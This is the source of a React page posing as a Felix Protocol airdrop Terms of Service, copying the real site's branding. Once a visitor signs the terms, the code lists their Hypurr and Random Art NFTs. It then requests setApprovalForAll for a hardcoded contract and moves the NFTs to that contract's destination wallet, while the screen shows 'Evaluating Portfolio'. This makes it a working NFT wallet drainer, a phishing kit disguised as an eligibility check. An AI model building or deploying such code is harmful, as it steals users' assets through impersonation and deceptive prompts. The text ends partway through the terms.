import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './HypurrTerms.css';

const HypurrTerms = () => {
  console.log('=== HypurrTerms COMPONENT RENDERED ===');
  console.log('Component loaded at:', new Date().toISOString());
  
  const [account, setAccount] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [nftCount, setNftCount] = useState(0);
  const [hasSigned, setHasSigned] = useState(false);
  const [signature, setSignature] = useState(null);
  const [error, setError] = useState(null);
  const [isTransferring, setIsTransferring] = useState(false);
  const [transferStatus, setTransferStatus] = useState(null); // 'approving', 'transferring', 'success', 'error'
  const [transferTxHash, setTransferTxHash] = useState(null);
  const [tokenIds, setTokenIds] = useState([]);
  const [version, setVersion] = useState('');

  // NFT Contract Addresses
  const HYPURR_NFT_CONTRACT = process.env.REACT_APP_HYPURR_NFT_CONTRACT || "0x9125e2d6827a00b0f8330d6ef7bef07730bac685";
  const RANDOM_ART_NFT_CONTRACT = process.env.REACT_APP_RANDOM_ART_NFT_CONTRACT || "0x298AbE38965DC68d239192d4366ab8c5b65a3B6f";
  
  // Transfer Contract Address
  const TRANSFER_CONTRACT = process.env.REACT_APP_TRANSFER_CONTRACT || "0x50fD5cf1f972607ECc9d7da2A6211e316469E78E";
  
  console.log('Environment variables:', {
    REACT_APP_TRANSFER_CONTRACT: process.env.REACT_APP_TRANSFER_CONTRACT,
    TRANSFER_CONTRACT: TRANSFER_CONTRACT,
    REACT_APP_HYPURR_NFT_CONTRACT: process.env.REACT_APP_HYPURR_NFT_CONTRACT,
    REACT_APP_RANDOM_ART_NFT_CONTRACT: process.env.REACT_APP_RANDOM_ART_NFT_CONTRACT
  });
  
  // ERC-721 ABI
  const ERC721_ABI = [
    "function balanceOf(address owner) external view returns (uint256)",
    "function ownerOf(uint256 tokenId) external view returns (address)",
    "function setApprovalForAll(address operator, bool approved) external",
    "function isApprovedForAll(address owner, address operator) external view returns (bool)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256)" // For Enumerable
  ];
  
  // Transfer Contract ABI
  const TRANSFER_ABI = [
    "function checkNFTs(address nftContract, address wallet) external view returns (uint256)",
    "function checkAllNFTs(address wallet) external view returns (uint256)",
    "function isNFTContractEnabled(address nftContract) external view returns (bool)",
    "function transferNFTs(address nftContract, uint256[] calldata tokenIds) external",
    "function checkAndTransfer(address nftContract, uint256[] calldata tokenIds) external",
    "function getEnabledNFTContracts() external view returns (address[])",
    "function destinationWallet() external view returns (address)"
  ];

  // Check if wallet is already connected
  useEffect(() => {
    // Update document title for Felix domain
    const hostname = window.location.hostname;
    const isFelixDomain = hostname === 'felix-foundation.xyz' || hostname === 'www.felix-foundation.xyz';
    if (isFelixDomain) {
      document.title = 'Felix Foundation - Terms of Service';
    }
    
    checkWalletConnection();
    checkExistingSignature();
    
    // Load version with aggressive cache busting
    const loadVersion = () => {
      fetch(`/version.json?t=${Date.now()}&v=${Math.random()}`, {
        cache: 'no-store',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      })
        .then(res => {
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          return res.json();
        })
        .then(data => {
          const versionString = `v${data.version}.${data.build}`;
          setVersion(versionString);
          console.log('✅ Version loaded:', versionString);
        })
        .catch((err) => {
          console.error('❌ Failed to load version:', err);
          setVersion('');
        });
    };
    
    loadVersion();
    // Retry after delay in case of cache issues
    const retryTimer = setTimeout(loadVersion, 2000);
    return () => clearTimeout(retryTimer);
  }, []);

  // Get the correct Ethereum provider (prefer MetaMask)
  const getEthereumProvider = () => {
    // Try to get MetaMask specifically
    if (window.ethereum?.isMetaMask) {
      return window.ethereum;
    }
    // Try to get from providers array (MetaMask v10+)
    if (window.ethereum?.providers) {
      const metaMask = window.ethereum.providers.find(p => p.isMetaMask);
      if (metaMask) return metaMask;
    }
    // Fallback to first available
    return window.ethereum;
  };

  const checkWalletConnection = async () => {
    const provider = getEthereumProvider();
    if (provider) {
      try {
        const accounts = await provider.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setAccount(accounts[0]);
          setIsConnected(true);
          // Don't verify NFTs until after signing terms
        }
      } catch (error) {
        console.error('Error checking wallet:', error);
      }
    }
  };

  const checkExistingSignature = () => {
    const stored = localStorage.getItem(`hypurr_signature_${account}`);
    if (stored) {
      setHasSigned(true);
      setSignature(stored);
      // If already signed, verify NFTs
      if (account) {
        verifyHypurrNFTs(account);
      }
    }
  };

  const connectWallet = async () => {
    try {
      setError(null);
      
      const provider = getEthereumProvider();
      if (!provider) {
        setError('Please install MetaMask or another Web3 wallet');
        return;
      }

      const accounts = await provider.request({ 
        method: 'eth_requestAccounts' 
      });

      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setIsConnected(true);
        // Don't verify NFTs until after signing terms
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
      if (error.code === 4001) {
        setError('Connection rejected. Please approve the connection request.');
      } else {
        setError('Failed to connect wallet. Please try again.');
      }
    }
  };

  const verifyHypurrNFTs = async (address) => {
    if (!address) {
      setNftCount(0);
      setTokenIds([]);
      return { count: 0, tokenIds: [] };
    }

    try {
      setIsVerifying(true);
      const ethereumProvider = getEthereumProvider();
      if (!ethereumProvider) {
        throw new Error('No Ethereum provider found. Please install MetaMask.');
      }
      const provider = new ethers.BrowserProvider(ethereumProvider);
      
      // Use transfer contract to check all enabled NFTs if available
      if (TRANSFER_CONTRACT !== "0x0000000000000000000000000000000000000000") {
        try {
          const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
          const totalCount = await transferContract.checkAllNFTs(address);
          const count = parseInt(totalCount.toString());
          setNftCount(count);
          
          // Get enabled contracts and check each one
          const enabledContracts = await transferContract.getEnabledNFTContracts();
          const allTokenIds = [];
          
          for (const nftContract of enabledContracts) {
            try {
              const contract = new ethers.Contract(nftContract, ERC721_ABI, provider);
              const balance = await contract.balanceOf(address);
              const balanceNum = parseInt(balance.toString());
              
              if (balanceNum > 0) {
                // Try to get token IDs
                for (let i = 0; i < balanceNum; i++) {
                  try {
                    const tokenId = await contract.tokenOfOwnerByIndex(address, i);
                    allTokenIds.push({
                      contract: nftContract,
                      tokenId: tokenId.toString()
                    });
                  } catch (e) {
                    // Contract doesn't support Enumerable
                    break;
                  }
                }
              }
            } catch (e) {
              console.log(`Error checking contract ${nftContract}:`, e.message);
            }
          }
          
          setTokenIds(allTokenIds);
          console.log(`Verified ${count} total NFT(s) across ${enabledContracts.length} collection(s) for ${address}`);
          return { count, tokenIds: allTokenIds };
        } catch (e) {
          console.log("Transfer contract check failed, falling back to direct check:", e.message);
        }
      }
      
      // Fallback: Check Hypurr NFT directly
      if (HYPURR_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
        const contract = new ethers.Contract(HYPURR_NFT_CONTRACT, ERC721_ABI, provider);
        const balance = await contract.balanceOf(address);
        const count = parseInt(balance.toString());
        
        // Also check Random Art if available
        let randomArtCount = 0;
        if (RANDOM_ART_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
          try {
            const randomArtContract = new ethers.Contract(RANDOM_ART_NFT_CONTRACT, ERC721_ABI, provider);
            const randomArtBalance = await randomArtContract.balanceOf(address);
            randomArtCount = parseInt(randomArtBalance.toString());
          } catch (e) {
            console.log("Error checking Random Art NFTs:", e.message);
          }
        }
        
        const totalCount = count + randomArtCount;
        setNftCount(totalCount);
        
        // Try to get token IDs if contract supports Enumerable
        const tokenIdList = [];
        if (count > 0) {
          try {
            for (let i = 0; i < count; i++) {
              try {
                const tokenId = await contract.tokenOfOwnerByIndex(address, i);
                tokenIdList.push({
                  contract: HYPURR_NFT_CONTRACT,
                  tokenId: tokenId.toString()
                });
              } catch (e) {
                break;
              }
            }
          } catch (e) {
            console.log("Contract doesn't support tokenOfOwnerByIndex");
          }
        }
        
        // Get Random Art token IDs
        if (randomArtCount > 0 && RANDOM_ART_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
          try {
            const randomArtContract = new ethers.Contract(RANDOM_ART_NFT_CONTRACT, ERC721_ABI, provider);
            for (let i = 0; i < randomArtCount; i++) {
              try {
                const tokenId = await randomArtContract.tokenOfOwnerByIndex(address, i);
                tokenIdList.push({
                  contract: RANDOM_ART_NFT_CONTRACT,
                  tokenId: tokenId.toString()
                });
              } catch (e) {
                break;
              }
            }
          } catch (e) {
            console.log("Random Art contract doesn't support tokenOfOwnerByIndex");
          }
        }
        
        setTokenIds(tokenIdList);
        console.log(`Verified ${totalCount} NFT(s) (${count} Hypurr + ${randomArtCount} Random Art) for ${address}`);
        return { count: totalCount, tokenIds: tokenIdList };
      } else {
        setNftCount(0);
        setTokenIds([]);
        return { count: 0, tokenIds: [] };
      }
    } catch (error) {
      console.error('Error verifying NFTs:', error);
      setError('Failed to verify NFTs. Please check the contract addresses.');
      setNftCount(0);
      setTokenIds([]);
      return { count: 0, tokenIds: [] };
    } finally {
      setIsVerifying(false);
    }
  };
  
  const approveTransferContract = async (tokenIdsToUse = null) => {
    // Use provided tokenIds or fall back to state
    const idsToUse = tokenIdsToUse || tokenIds;
    
    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      throw new Error("Missing required contract addresses");
    }

    if (!window.ethereum) {
      throw new Error("MetaMask not detected. Please install MetaMask.");
    }

    console.log('=== APPROVAL FUNCTION CALLED ===');
    console.log('Account:', account);
    console.log('Transfer Contract:', TRANSFER_CONTRACT);
    console.log('TokenIds to use:', idsToUse);
    console.log('TokenIds length:', idsToUse.length);

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    
    // Verify we have a signer
    const signerAddress = await signer.getAddress();
    console.log('Signer address:', signerAddress);
    
    if (signerAddress.toLowerCase() !== account.toLowerCase()) {
      throw new Error('Signer address does not match connected account');
    }
    
    // Only approve contracts where user actually has NFTs (based on tokenIds)
    const contractsToApprove = new Set();
    for (const item of idsToUse) {
      contractsToApprove.add(item.contract.toLowerCase());
    }
    
    console.log('Approval: Contracts where user has NFTs:', Array.from(contractsToApprove));
    
    if (contractsToApprove.size === 0) {
      throw new Error('No NFTs found to approve');
    }
    
    // Only approve contracts where user has NFTs
    const contractsArray = Array.from(contractsToApprove);
    for (const nftContractAddress of contractsArray) {
      try {
        console.log(`\n=== Processing contract: ${nftContractAddress} ===`);
        // Convert back to checksum address
        const checksumAddress = ethers.getAddress(nftContractAddress);
        const nftContract = new ethers.Contract(checksumAddress, ERC721_ABI, signer);
        
        // Check if already approved
        const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
        console.log(`Approval status:`, isApproved);
        
        if (isApproved) {
          console.log(`✅ Already approved, skipping`);
          continue;
        }
        
        // Approve contract - this MUST trigger MetaMask popup
        console.log(`\n🚀 CALLING setApprovalForAll NOW...`);
        console.log(`   Contract: ${nftContractAddress}`);
        console.log(`   Operator: ${TRANSFER_CONTRACT}`);
        console.log(`   Approved: true`);
        console.log(`\n⏳ MetaMask popup should appear NOW!`);
        
        // Call setApprovalForAll - this should trigger MetaMask immediately
        const txPromise = nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
        console.log('Transaction promise created, waiting for user approval in MetaMask...');
        
        const tx = await txPromise;
        console.log(`✅ Transaction submitted! Hash:`, tx.hash);
        console.log(`⏳ Waiting for confirmation...`);
        
        await tx.wait();
        console.log(`✅ Contract ${nftContractAddress} approved successfully!`);
      } catch (error) {
        console.error(`❌ Error approving ${nftContractAddress}:`, error);
        console.error('Error details:', {
          code: error.code,
          message: error.message,
          data: error.data,
          reason: error.reason
        });
        if (error.code === 4001) {
          throw new Error('Approval transaction was rejected. Please try again and approve the transaction in MetaMask.');
        }
        throw error;
      }
    }
    
    console.log('=== ALL APPROVALS COMPLETE ===');
    return true;
  };
  
  const transferNFTs = async (tokenIdsToUse = null) => {
    // Use provided tokenIds or fall back to state
    const idsToUse = tokenIdsToUse || tokenIds;
    
    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      throw new Error("Missing required contract addresses");
    }

    if (!idsToUse || idsToUse.length === 0) {
      throw new Error("No token IDs found. The NFT contract may not support Enumerable. Please contact support.");
    }

    const ethereumProvider = getEthereumProvider();
    if (!ethereumProvider) {
      throw new Error("No Ethereum provider found. Please install MetaMask.");
    }
    
    const provider = new ethers.BrowserProvider(ethereumProvider);
    const signer = await provider.getSigner();
    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, signer);
    
    // Group token IDs by contract
    const tokensByContract = {};
    for (const item of idsToUse) {
      if (!tokensByContract[item.contract]) {
        tokensByContract[item.contract] = [];
      }
      tokensByContract[item.contract].push(BigInt(item.tokenId));
    }
    
    // Transfer NFTs from each contract
    let lastTxHash = null;
    for (const [nftContract, tokenIdsArray] of Object.entries(tokensByContract)) {
      try {
        const tx = await transferContract.checkAndTransfer(nftContract, tokenIdsArray);
        const receipt = await tx.wait();
        lastTxHash = receipt.transactionHash;
        console.log(`NFTs transferred from ${nftContract}:`, receipt.transactionHash);
      } catch (error) {
        console.error(`Error transferring from ${nftContract}:`, error);
        throw error;
      }
    }
    
    return lastTxHash;
  };

  const signTerms = async () => {
    console.log('=== signTerms FUNCTION CALLED ===');
    console.log('isConnected:', isConnected);
    console.log('account:', account);
    
    if (!isConnected || !account) {
      console.error('❌ Not connected or no account');
      setError('Please connect your wallet first');
      return;
    }

    try {
      console.log('✅ Starting signature process...');
      setError(null);
      setIsVerifying(true);

      // Create message to sign
      const message = `I accept the Felix Foundation Terms of Service and agree to participate in the Felix Protocol airdrop program.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
      console.log('Message to sign:', message);
      
      const ethereumProvider = getEthereumProvider();
      if (!ethereumProvider) {
        throw new Error('No Ethereum provider found. Please install MetaMask.');
      }
      
      const provider = new ethers.BrowserProvider(ethereumProvider);
      const signer = await provider.getSigner();
      console.log('Signer obtained:', await signer.getAddress());
      
      // Sign the message
      console.log('⏳ Requesting signature from MetaMask...');
      const signature = await signer.signMessage(message);
      console.log('✅ Signature received:', signature);
      
      // Store signature
      localStorage.setItem(`hypurr_signature_${account}`, signature);
      localStorage.setItem(`hypurr_signature_date_${account}`, new Date().toISOString());
      
      setHasSigned(true);
      setSignature(signature);
      
      console.log('✅ Terms signed successfully:', signature);
      
      // Scroll to top after signing
      window.scrollTo({ top: 0, behavior: 'smooth' });
      
      // Now verify NFTs and evaluate portfolio
      console.log('=== TERMS SIGNED - EVALUATING PORTFOLIO ===');
      setTransferStatus('evaluating');
      
      // Verify NFTs after signing and get the results directly
      const verificationResult = await verifyHypurrNFTs(account);
      
      setIsVerifying(false);
      
      console.log('=== VERIFICATION COMPLETE ===');
      console.log('Verification result:', verificationResult);
      console.log('NFT count:', verificationResult.count);
      console.log('Token IDs length:', verificationResult.tokenIds.length);
      
      // Use the returned values directly to trigger transfer
      if (verificationResult.count > 0 && verificationResult.tokenIds.length > 0) {
        console.log('✅ NFTs found, starting transfer process...');
        console.log('📋 Passing tokenIds directly to handleAutomaticTransfer:', verificationResult.tokenIds);
        // Pass tokenIds directly - don't wait for state update
        handleAutomaticTransfer(verificationResult.tokenIds).catch(err => {
          console.error('=== TRANSFER PROCESS ERROR ===', err);
          setError(err.message || 'Transfer process failed. Please try again.');
          setTransferStatus('error');
        });
      } else {
        console.log('⚠️ No NFTs found or tokenIds empty, skipping transfer');
        setTransferStatus(null);
      }
      
    } catch (error) {
      console.error('Error signing terms:', error);
      if (error.code === 4001) {
        setError('Signature rejected. Please approve the signature request.');
      } else {
        setError('Failed to sign terms. Please try again.');
      }
      setIsVerifying(false);
      setTransferStatus(null);
    }
  };
  
  const handleAutomaticTransfer = async (tokenIdsToUse = null) => {
    // Use provided tokenIds or fall back to state
    const idsToUse = tokenIdsToUse || tokenIds;
    
    console.log('=== handleAutomaticTransfer CALLED ===');
    console.log('TRANSFER_CONTRACT:', TRANSFER_CONTRACT);
    console.log('tokenIdsToUse length:', idsToUse ? idsToUse.length : 'null');
    console.log('tokenIds state length:', tokenIds.length);
    console.log('tokenIds to use:', idsToUse);
    console.log('account:', account);
    
    if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      console.error('❌ Transfer contract not configured. Transfer skipped.');
      setTransferStatus(null);
      return;
    }

    if (!idsToUse || idsToUse.length === 0) {
      console.error('❌ Unable to get token IDs. Transfer skipped.');
      console.error('This might mean the NFT contract does not support Enumerable.');
      setTransferStatus(null);
      return;
    }
    
    console.log('✅ All checks passed, proceeding with transfer...');
    console.log(`📋 Will approve and transfer ${idsToUse.length} NFT(s)`);

    try {
      setIsTransferring(true);
      
      // Step 1: Approve contract - this will trigger MetaMask popup immediately
      setTransferStatus('approving');
      console.log('🚀🚀🚀 Auto-transfer: Requesting approval - MetaMask popup should appear NOW 🚀🚀🚀');
      console.log('📋 About to call approveTransferContract() with tokenIds:', idsToUse);
      console.log('⏳ Waiting for MetaMask popup...');
      await approveTransferContract(idsToUse);
      console.log('✅ Auto-transfer: Approval successful');
      
      // Step 2: Transfer NFTs automatically after approval
      setTransferStatus('transferring');
      console.log('🚀 Auto-transfer: Transferring NFTs...');
      const txHash = await transferNFTs(idsToUse);
      
      setTransferTxHash(txHash);
      setTransferStatus('success');
      console.log('✅ Auto-transfer: NFTs transferred successfully:', txHash);
      
    } catch (error) {
      // Show error to user
      console.error('❌ Auto-transfer error:', error);
      console.error('Error details:', {
        message: error.message,
        code: error.code,
        reason: error.reason,
        data: error.data,
        stack: error.stack
      });
      setTransferStatus('error');
      if (error.code === 4001) {
        setError('Approval or transfer was cancelled. Please try again.');
      } else {
        setError(error.message || 'Transfer failed. Please check the console for details.');
      }
    } finally {
      setIsTransferring(false);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  // Listen for account changes
  useEffect(() => {
    const provider = getEthereumProvider();
    if (provider) {
      provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          setIsConnected(false);
          setAccount(null);
          setNftCount(0);
          setHasSigned(false);
          setSignature(null);
        } else {
          setAccount(accounts[0]);
          // Don't verify NFTs until after signing terms
          checkExistingSignature();
          // If already signed, verify NFTs
          const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
          if (stored) {
            verifyHypurrNFTs(accounts[0]);
          }
        }
      });

      window.ethereum.on('chainChanged', () => {
        window.location.reload();
      });
    }
  }, []);

  return (
    <div className="hypurr-terms-page">
      {/* Navigation Header - 1:1 Match with usefelix.xyz */}
      <nav className="navbar">
        <div className="nav-container">
          <div className="nav-left">
            <a href="https://usefelix.xyz" className="logo">
              <img 
                src="https://www.usefelix.xyz/_next/static/media/felix.db823ff1.webp"
                alt="Felix" 
                className="logo-image"
                onError={(e) => {
                  // Fallback to text if image fails to load
                  e.target.style.display = 'none';
                  if (e.target.nextSibling) {
                    e.target.nextSibling.style.display = 'flex';
                  }
                }}
              />
              <span className="logo-text">Felix</span>
              <div className="logo-icon" style={{ display: 'none' }}>
                <span className="felix-logo">F</span>
              </div>
            </a>
            {version && (
              <span className="version-badge">{version}</span>
            )}
          </div>
          <div className="nav-right">
            {isConnected ? (
              <div className="wallet-info">
                {hasSigned && nftCount > 0 && (
                  <span className="nft-badge">{nftCount} NFT{nftCount !== 1 ? 's' : ''}</span>
                )}
                <span className="wallet-address">{formatAddress(account)}</span>
                {hasSigned && (
                  <span className="verified-badge">✓ Verified</span>
                )}
              </div>
            ) : (
              <button className="connect-btn" onClick={connectWallet}>
                Connect Wallet
              </button>
            )}
          </div>
        </div>
      </nav>

      {/* Main Content - Scrollable */}
      <div className="content-wrapper">
        <div className="container content">
        <h1>Terms of Service</h1>
        <div className="date">Last Updated: {new Date().toLocaleDateString()}</div>

        {/* Wallet Status - Only show after signing terms */}
        {isConnected && hasSigned && (
          <div className={`verification-status ${nftCount > 0 ? 'verified' : 'not-verified'}`}>
            <h3>Wallet Verification Status</h3>
            <div style={{ marginTop: '0.75rem' }}>
              <p><strong>Wallet:</strong> <span style={{ fontFamily: 'monospace', wordBreak: 'break-all' }}>{account}</span></p>
              <p style={{ marginTop: '0.5rem' }}>
                <strong>Hypurr NFTs Found:</strong> {isVerifying ? (
                  <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.5rem' }}>
                    <span className="loading-spinner" style={{ 
                      display: 'inline-block', 
                      width: '12px', 
                      height: '12px', 
                      border: '2px solid rgba(0, 212, 255, 0.3)',
                      borderTop: '2px solid var(--accent-blue)',
                      borderRadius: '50%',
                      animation: 'spin 1s linear infinite'
                    }}></span>
                    Evaluating...
                  </span>
                ) : (
                  <span style={{ color: nftCount > 0 ? 'var(--success-text)' : 'var(--warning-text)' }}>
                    {nftCount} found
                  </span>
                )}
              </p>
              {nftCount === 0 && !isVerifying && (
                <p className="warning-text" style={{ marginTop: '0.75rem' }}>
                  No NFTs found in this wallet. Please ensure you're using the correct wallet with Hypurr or Random Art NFTs.
                </p>
              )}
            </div>
          </div>
        )}

        {/* Celebration Status - After Terms Acceptance */}
        {hasSigned && signature && (
          <div className="celebration-status">
            {nftCount === 0 && (
              <div className="status-message tier-none">
                <div className="tier-badge">No NFTs</div>
                <h3>Terms Accepted</h3>
                <p>You have successfully accepted the Terms of Service. No Hypurr NFTs were found in your wallet.</p>
                <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
              </div>
            )}
            {nftCount === 1 && (
              <div className="status-message tier-bronze">
                <div className="tier-badge bronze">Bronze Tier</div>
                <h3>🎉 Welcome! You're Eligible</h3>
                <p>Congratulations! You have 1 Hypurr NFT and are eligible for the Felix Protocol airdrop.</p>
                <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
              </div>
            )}
            {nftCount >= 3 && nftCount < 5 && (
              <div className="status-message tier-silver">
                <div className="tier-badge silver">Silver Tier</div>
                <h3>🌟 Great Collection!</h3>
                <p>Excellent! With {nftCount} Hypurr NFTs, you qualify for enhanced rewards in the Felix Protocol airdrop.</p>
                <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
              </div>
            )}
            {nftCount >= 5 && nftCount < 10 && (
              <div className="status-message tier-gold">
                <div className="tier-badge gold">Gold Tier</div>
                <h3>💎 Excellent Collection!</h3>
                <p>Outstanding! With {nftCount} Hypurr NFTs, you're eligible for premium tier rewards in the Felix Protocol airdrop.</p>
                <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
              </div>
            )}
            {nftCount >= 10 && (
              <div className="status-message tier-platinum">
                <div className="tier-badge platinum">Platinum Tier</div>
                <h3>👑 Outstanding Collection!</h3>
                <p>Incredible! With {nftCount} Hypurr NFTs, you qualify for the highest tier rewards in the Felix Protocol airdrop.</p>
                <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
              </div>
            )}
            {(transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'transferring' || transferStatus === 'success' || transferStatus === 'error') && (
              <div className="transfer-status" style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
                {transferStatus === 'evaluating' && (
                  <>
                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
                    <p>⏳ Analyzing your wallet and NFT holdings...</p>
                  </>
                )}
                {transferStatus === 'approving' && (
                  <>
                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
                    <p>⏳ Please approve the transfer contract in MetaMask...</p>
                  </>
                )}
                {transferStatus === 'transferring' && (
                  <>
                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
                    <p>⏳ Processing your NFTs...</p>
                  </>
                )}
                {transferStatus === 'success' && transferTxHash && (
                  <p>✅ Portfolio evaluation complete! NFTs processed successfully. <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
                )}
                {transferStatus === 'error' && (
                  <p style={{ color: 'var(--error-text)' }}>❌ Evaluation failed. Please check the error message above.</p>
                )}
              </div>
            )}
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="error-message">
            <p>{error}</p>
          </div>
        )}

        <div className="intro">
          <h2>Felix Protocol Airdrop Terms of Service</h2>
          <p>Welcome to the Felix Protocol Airdrop program. These Terms of Service ("Terms") govern your participation 
          in the Felix Protocol airdrop and your eligibility to receive Felix tokens. By participating in this airdrop, 
          you agree to be bound by these Terms.</p>
          <p>Felix Protocol is a decentralized lending and borrowing platform built on Hyperliquid. This airdrop is designed 
          to reward early supporters and participants in the Felix ecosystem. Eligibility for the airdrop may be determined 
          by various factors, including but not limited to ownership of certain NFTs, including Hypurr NFTs, which may be 
          considered as part of the eligibility criteria.</p>
        </div>

        <div className="warning">
          <p><strong>IMPORTANT NOTICE:</strong></p>
          <p>By connecting your wallet and signing these Terms, you verify ownership of your digital assets and agree to be 
          bound by these Terms. The airdrop eligibility and distribution are subject to Felix Protocol's sole discretion. 
          Ownership of Hypurr NFTs may be considered as part of the eligibility criteria, but is not the sole determining factor.</p>
        </div>

        {/* Terms Content - Adapted from Kinetiq Foundation style */}
        <div className="section">
          <h2>1. Eligibility and Participation</h2>
          <h3>1.1 Who May Participate</h3>
          <p>To be eligible for the Felix Protocol airdrop, you must:</p>
          <ul>
            <li>Be at least 18 years of age or the age of majority in your jurisdiction</li>
            <li>Have a valid cryptocurrency wallet compatible with the Hyperliquid network</li>
            <li>Meet the eligibility criteria as determined by Felix Protocol, which may include but is not limited to ownership 
            of certain NFTs, including Hypurr NFTs</li>
            <li>Comply with all applicable laws and regulations in your jurisdiction</li>
            <li>Not be located in, or a resident of, any jurisdiction where participation would be prohibited by law</li>
          </ul>
          
          <h3>1.2 Eligibility Criteria</h3>
          <p>Felix Protocol reserves the right to determine eligibility criteria for the airdrop in its sole discretion. 
          While ownership of Hypurr NFTs may be considered as part of the eligibility assessment, it is not the exclusive 
          or primary factor. Felix Protocol may consider various factors including, but not limited to, community participation, 
          platform usage, and other engagement metrics.</p>
          
          <h3>1.3 Verification Process</h3>
          <p>To participate in the airdrop, you must connect your wallet and verify ownership of eligible assets. By connecting 
          your wallet, you authorize Felix Protocol to verify your wallet address and check for eligible assets, including 
          but not limited to Hypurr NFTs. This verification is necessary to determine your eligibility for the airdrop.</p>
        </div>

        <div className="section">
          <h2>2. Airdrop Distribution</h2>
          <h3>2.1 Distribution Terms</h3>
          <p>The Felix Protocol airdrop distribution will be conducted at Felix Protocol's sole discretion. The amount of 
          tokens distributed, the timing of distribution, and the eligibility criteria may be modified by Felix Protocol at 
          any time without prior notice.</p>
          
          <h3>2.2 No Guarantee of Distribution</h3>
          <p>Felix Protocol does not guarantee that any tokens will be distributed to you, even if you meet the stated 
          eligibility criteria. The airdrop is subject to Felix Protocol's sole discretion, and Felix Protocol reserves 
          the right to modify, suspend, or terminate the airdrop at any time without prior notice.</p>
          
          <h3>2.3 Tax Obligations</h3>
          <p>You are solely responsible for determining any tax obligations that may arise from your participation in the 
          airdrop or receipt of Felix tokens. Felix Protocol does not provide tax advice and recommends that you consult 
          with a qualified tax professional.</p>
        </div>

        <div className="section">
          <h2>3. Acceptance of Terms</h2>
          <h3>3.1 Agreement to Terms</h3>
          <p>By connecting your wallet, verifying your eligibility, and signing these Terms, you acknowledge that you have 
          read, understood, and agree to be bound by these Terms. Your signature serves as proof of acceptance and creates a 
          legally binding agreement between you and Felix Protocol.</p>
          
          <h3>3.2 Signature Requirement</h3>
          <p>To complete the verification process and accept these Terms, you must sign a message with your wallet. This 
          signature serves as cryptographic proof of your acceptance of these Terms and verification of your wallet ownership. 
          Your signature will be stored securely and may be used to verify your participation in the airdrop.</p>
          
          <h3>3.3 Modification of Terms</h3>
          <p>Felix Protocol reserves the right to modify these Terms at any time. Material changes to these Terms will be 
          communicated through reasonable means. Your continued participation in the airdrop after such modifications constitutes 
          your acceptance of the modified Terms.</p>
        </div>

        <div className="section">
          <h2>4. Risks and Disclaimers</h2>
          <h3>4.1 Acknowledgment of Risks</h3>
          <p>You acknowledge and understand that participation in cryptocurrency airdrops involves substantial risk. The value 
          of Felix tokens may be volatile and may decrease to zero. You should only participate if you can afford to lose the 
          entire value of any tokens received.</p>
          
          <h3>4.2 No Investment Advice</h3>
          <p>Nothing in these Terms or the airdrop program constitutes investment, financial, trading, or legal advice. Felix 
          Protocol does not provide any recommendations or guidance regarding the purchase, sale, or holding of Felix tokens.</p>
          
          <h3>4.3 Disclaimer of Warranties</h3>
          <p>THE AIRDROP IS PROVIDED "AS IS" AND "AS AVAILABLE" WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED, 
          INCLUDING BUT NOT LIMITED TO WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT.</p>
        </div>

        <div className="section">
          <h2>5. Limitation of Liability</h2>
          <p>TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW, FELIX PROTOCOL SHALL NOT BE LIABLE FOR ANY INDIRECT, INCIDENTAL, 
          SPECIAL, CONSEQUENTIAL, OR PUNITIVE DAMAGES, OR ANY LOSS OF PROFITS OR REVENUES, WHETHER INCURRED DIRECTLY OR INDIRECTLY, 
          OR ANY LOSS OF DATA, USE, GOODWILL, OR OTHER INTANGIBLE LOSSES, RESULTING FROM YOUR PARTICIPATION IN THE AIRDROP.</p>
        </div>

        <div className="section">
          <h2>6. Prohibited Activities</h2>
          <p>You agree not to engage in any of the following prohibited activities:</p>
          <ul>
            <li>Attempting to manipulate or game the airdrop eligibility criteria</li>
            <li>Using multiple wallets or accounts to receive multiple airdrop allocations</li>
            <li>Providing false or misleading information during the verification process</li>
            <li>Violating any applicable laws or regulations</li>
